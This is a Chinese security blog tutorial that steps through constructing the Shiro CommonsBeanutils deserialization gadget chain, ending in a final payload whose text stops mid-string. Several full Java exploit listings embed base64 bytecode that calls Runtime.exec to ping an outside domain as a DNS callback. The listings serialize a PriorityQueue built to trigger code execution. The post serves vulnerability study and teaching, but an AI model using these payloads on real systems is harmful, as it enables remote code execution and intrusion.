---
layout: mypost
title: "Shiro反序列化原生链-CommonsBeanutils链"
categories: [Java安全]
---

## 前言

之前分析 Shiro 反序列化漏洞，得知原生的 Shiro 框架中带着 commons-collections 依赖是没办法进行漏洞利用的，所以在准备工作时做过重要的一步：手动添了一个 commons-collections-3.2.1 的依赖。难道目标环境中只有一个 Shiro 框架的依赖，真的没有办法进行利用吗？答案是否定的，看看这条无 commons-collections 的 Shiro 反序列化利用链-->CommonsBeanutils 链。

## 初识 commons-beanutils

commons-beanutils 是 Apache Commons 项目中的一个工具库，它提供了一组用于操作 Java Bean 的工具类和方法，和 CommonCollections 一样，都是为了开发更方便。简单列举几个方便的功能：

- PropertyUtils.getProperty()：获取 JavaBean 属性值（支持嵌套）
- BeanUtils.getProperty()：获取属性并自动转为字符串
- PropertyUtils.copyProperties()：将属性从一个对象复制到另一个对象（原始类型）
  ......

更多用途可参考[Commons BeanUtils 官方文档](https://commons.apache.org/proper/commons-beanutils/)，而对于安全人员一定要记住它是 Shiro 框架中自带的。

## 确定 Sink

目前为止，接触到的 sink 点就两处，一处是 InvokerTransformer 类中的 transform 方法（即任意命令执行），另一处是 TemplatesImpl 类中的 newTransformer 方法（即恶意类加载）。如今 commons-collections-3.2.1 依赖被 Ban 掉了，第一处是彻底无望，只能考虑第二处，而 CommonsBeanutils 链的 sink 就是第二处。

先将 Sink 粘出来：

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.lang.reflect.Field;
import java.util.Base64;

public class CommonsBeanutils  {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        templatesImpl.newTransformer();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

似曾相识的，在此代码基础上，对`templatesImpl.newTransformer()`用 InstantiateTransformer，向前继续构造就会得到 CommonsCollections3 链，那么 CommonsBeanutils 链是怎么向前走的？

## CommonsBeanutils 链 de 精髓

不班门弄斧了，精髓就在 PropertyUtils.getProperty()，先简单写个 demo 看一下此方法的用途：

写个简单的 JavaBean-->

```java
public class Person {
    private String name;
    private int age;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }
}
```

然后可以用 PropertyUtils.getProperty 这样动态调用它的属性-->

```java
import org.apache.commons.beanutils.PropertyUtils;

public class Main {
    public static void main(String[] args) throws Exception {
        Person person = new Person();
        person.setName("xxx");
        person.setAge(0);

        // 动态调用 getter
        String name = (String) PropertyUtils.getProperty(person, "name");
        int age = (int) PropertyUtils.getProperty(person, "age");

        System.out.println("姓名: " + name);
        System.out.println("年龄: " + age);
    }
}
```

输出结果如下-->

```
姓名: xxx
年龄: 0
```

跟一下`PropertyUtils.getProperty()`这行代码，看看究竟做了什么？跟到如下的堆栈处-->

```
getSimpleProperty:1332, PropertyUtilsBean (org.apache.commons.beanutils)
getNestedProperty:770, PropertyUtilsBean (org.apache.commons.beanutils)
getProperty:846, PropertyUtilsBean (org.apache.commons.beanutils)
getProperty:426, PropertyUtils (org.apache.commons.beanutils)
main:10, Main
```

可以看出是反射调用了 getName 方法-->

![](image-341.png)

![](image-342.png)

得出结论：调用`String name = (String) PropertyUtils.getProperty(person, "name");`相当于调用了`person.getName();`。

回到刚刚的 Sink 处，将`templatesImpl.newTransformer();`向前跟一点，看它的方法调用情况，如下-->

![](image-343.png)

其中存在一个 getOutputProperties 方法，且是 public 的。将 payload 向前写一点，如下-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import java.lang.reflect.Field;
import java.util.Base64;

public class CommonsBeanutils  {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        templatesImpl.getOutputProperties();
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

同样成功触发 DNS 请求，如下-->

![](image-48.png)

结合前面的结论，不难得出，链要继续向前走，可以在 commons-beanutils 库中寻找合适的`PropertyUtils.getProperty()`即可（合适指的是 getProperty 方法中参数可控），在如下位置找到了合适的方法-->

![](image-344.png)

其中 o1、o2、property 三个变量均可控，将代码继续向前写一点，如下-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;

import java.lang.reflect.Field;
import java.util.Base64;

public class CommonsBeanutils  {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        BeanComparator beanComparator = new BeanComparator("outputProperties");
        beanComparator.compare(templatesImpl, templatesImpl);
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
}
```

运行成功触发 DNS 请求，如下-->

![](image-48.png)

## 结合 CC4 构造

见到 `beanComparator.compare(templatesImpl, templatesImpl);` 中的 compare 方法，要继续向前走，CommonsCollections2 的作者也早已给出答案：PriorityQueue.readObject().heapify()-->PriorityQueue.heapify().siftDown()-->PriorityQueue.siftDown().siftDownUsingComparator()-->PriorityQueue.siftDownUsingComparator()含有 comparator.compare(xxx)。

还是借鉴 DNSURL 链的思路，先执行后反射修改 PriorityQueue 类的 comparator 以及 queue 属性，如下-->

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class CommonsBeanutils  {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcAAAAEAAEAGAABABEAGQACAAwAAABJAAAABAAAAAGxAAAAAgANAAAABgABAAAAEQAOAAAAKgAEAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABoAGwACAAAAAQAcAB0AAwAXAAAABAABABgACAAeAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAsACQAOAAwADAANAA0AFgAPAA4AAAAMAAEADQAJAB8AIAAAACEAAAAHAAJMBwAiCQABACMAAAACACQ=");
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][] {code});
        setFieldValue(templatesImpl, "_name", "xxx");
        setFieldValue(templatesImpl, "_tfactory", new TransformerFactoryImpl());
        BeanComparator beanComparator = new BeanComparator("outputProperties");
        PriorityQueue priorityQueue = new PriorityQueue();
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class<?> clazzPriorityQueue = priorityQueue.getClass();
        Field field = clazzPriorityQueue.getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, beanComparator);
        Field fieldQueue = clazzPriorityQueue.getDeclaredField("queue");
        fieldQueue.setAccessible(true);
        Object[] internalQueue = (Object[]) fieldQueue.get(priorityQueue);
        internalQueue[0] = templatesImpl;
        internalQueue[1] = templatesImpl;
        serializeObject(priorityQueue);
        unSerializeObject("ser.bin");
    }
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void serializeObject(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static Object unSerializeObject(String Filename) throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(Filename));
        return inputStream.readObject();
    }
}
```

执行后，成功触发 DNS 请求，如下-->

![](image-48.png)

## 问题 & 解决方案

其实上面的 Payload 并不算是严格意义上 Shiro 原生的链，它其中也会用到 commons-collections 依赖，当把 maven 中的 commons-collections-3.2.1 依赖移除后，上面的 Payload 就无法触发 DNS 请求了。执行报错如下-->

```
Exception in thread "main" java.lang.NoClassDefFoundError: org/apache/commons/collections/comparators/ComparableComparator
	at org.apache.commons.beanutils.BeanComparator.<init>(BeanComparator.java:81)
	at com.kun.CommonsBeanutils.main(CommonsBeanutils.java:21)
Caused by: java.lang.ClassNotFoundException: org.apache.commons.collections.comparators.ComparableComparator
	at java.net.URLClassLoader.findClass(URLClassLoader.java:381)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:424)
	at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:331)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:357)
	... 2 more
```

报错原因是程序在运行时 找不到 ComparableComparator 这个类，而它属于 commons-collections 包。为什么会这样呢？

其实 commons-beanutils 原本就要依赖 commons-collections，在 Shiro 中内置的 commons-beanutils 版本包含了它所要用到的 commons-collections 依赖中的部分类，如下-->

![](image-345.png)

但只包含了 collections 的部分类，并不完整。这就导致：正常使用 Shiro 时不需要额外引入 commons-collections，但如果要利用反序列化漏洞，比如用到 BeanComparator，理论上就要手动引入完整的 commons-collections 依赖。这么看，要想利用 Shiro 反序列化漏洞， commons-collections 这个依赖是必不可少的，有没有绕过方案呢？答案是有的。

首先观察为什么要使用到 ComparableComparator 这个类？是在下图中的位置-->

![](image-346.png)

嗯嗯没错，是 BeanComparator 的构造方法中使用到了，对应 payload 中的`BeanComparator beanComparator = new BeanComparator("outputProperties");`这一行代码。

好在 BeanComparator 这个类中还有另一个构造方法，如下-->

![](image-347.png)

提前构造好 ComparableComparator 类的实例，然后再调用 BeanComparator 的构造方法即可。跟一下`ComparableComparator.getInstance()`这一行代码都做了哪些事情，如下-->

![](image-348.png)

![](image-349.png)

![](image-350.png)

![](image-351.png)

而它的父类即是 Object，如下-->

![](image-352.png)

既然不能用 ComparableComparator ，那就找到一个类来替换，显然它要满足下面这几个条件便可以：

- 实现 java.util.Comparator 接口
- 实现 java.io.Serializable 接口
- Java、shiro 或 commons-beanutils 自带

最终 CommonsBeanutils 链的作者找到 CaseInsensitiveComparator 这个类，如下-->

![](image-353.png)

那么绕过 commons-collections 依赖的限制，换一个构造函数即可，挺简单的不啰嗦了，给出 payload 如下-->

```java
package com.kun;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.PriorityQueue;

public class CommonsBeanutils  {
    public static void main(String[] args) throws Exception {
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQANgoACQAlCgAmACcIACgKACYAKQcAKgcAKwoABgAsBwAtBwAuAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEAA2RvbQEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcALwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAIPGNsaW5pdD4BAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQANU3RhY2tNYXBUYWJsZQcAKgEAClNvdXJjZUZpbGUBAAhETlMuamF2YQwACgALBwAwDAAxADIBAB9waW5nIDZ5N2Q1LmN4c3lzLnNwYWNlc3RhYnMudG9wDAAzADQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAAoANQEAA0ROUwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAYKExqYXZhL2xhbmcvVGhyb3dhYmxlOylWACEACAAJAAAAAAAEAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAACAAOAAAADAABAAAABQAPABAAAAABABEAEgACAAwAAAA/AAAAAwAAAAGxAAAAAgANAAAABgABAAAAEAAOAAAAIAADAAAAAQAPABAAAAAAAAEAEwAUAAEAAAABABUAFgACABcA